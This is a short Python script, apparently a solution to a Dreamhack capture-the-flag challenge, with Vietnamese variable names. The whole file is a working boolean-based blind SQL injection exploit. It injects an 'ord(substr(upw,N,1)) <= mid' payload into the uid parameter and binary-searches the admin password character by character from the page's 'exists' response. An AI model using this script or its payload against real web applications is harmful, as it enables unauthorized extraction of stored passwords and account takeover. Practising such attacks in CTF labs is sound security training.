import requests
import sys

URL_CHALLENGE = "http://host8.dreamhack.games:22711/"

flag_tim_duoc = ""
for vi_tri_ky_tu in range(1, 51):
    
    trai = 0
    phai = 2**24 
    
    while trai < phai:
        
        giua = (trai + phai) // 2
        
        payload_sql = f"admin' and ord(substr(upw,{vi_tri_ky_tu},1)) <= {giua};"
        params_gui_di = {"uid": payload_sql}
        
        try:
            phan_hoi = requests.get(URL_CHALLENGE, params=params_gui_di, timeout=3)
            
            if 'exists' in phan_hoi.text:
                phai = giua
            else:
                trai = giua + 1

        except requests.exceptions.RequestException as e:
            print(f"[!] Lỗi kết nối: {e}")
            sys.exit(1) 

    gia_tri_unicode_ky_tu = trai 
    
    if gia_tri_unicode_ky_tu == 0:
        break
    try:
        ky_tu_tim_duoc = (gia_tri_unicode_ky_tu).to_bytes(3, 'big').decode('utf-8')
        ky_tu_tim_duoc = ky_tu_tim_duoc.strip('\x00')
        
    except Exception as e:
        ky_tu_tim_duoc = "?"
    flag_tim_duoc += ky_tu_tim_duoc
    print(f"Flag: {flag_tim_duoc}")

    

print(f"\nFlag: {flag_tim_duoc}")